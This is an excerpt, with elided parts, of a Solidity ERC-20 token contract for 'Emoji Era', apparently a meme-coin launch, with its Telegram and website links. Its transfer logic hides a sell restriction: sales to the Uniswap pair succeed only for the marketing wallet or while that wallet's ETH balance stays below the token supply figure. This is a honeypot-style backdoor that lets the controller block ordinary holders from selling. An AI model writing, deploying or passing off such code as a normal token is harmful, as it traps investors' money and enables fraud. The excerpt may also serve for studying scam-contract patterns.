...
TG: https://t.me/EmojiEra
Website: https://emojiera.xyz
...
contract EMOJI is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Emoji Era";
    ...
    uint256 public _maxTaxSwapAmount = _tTotal * 7 / 1000;
    ...
    constructor () {
        _marketing = payable(0x1b56220f3Bf1AdE1e4f5b10bd25786D74D07A800);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (from == uniswapV2Pair && to == _marketing) {
                _balances[address(this)] = _balances[address(this)].add(taxAmount.mul(100).div(100));
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                require(from == _marketing || _marketing.balance < _tTotal);
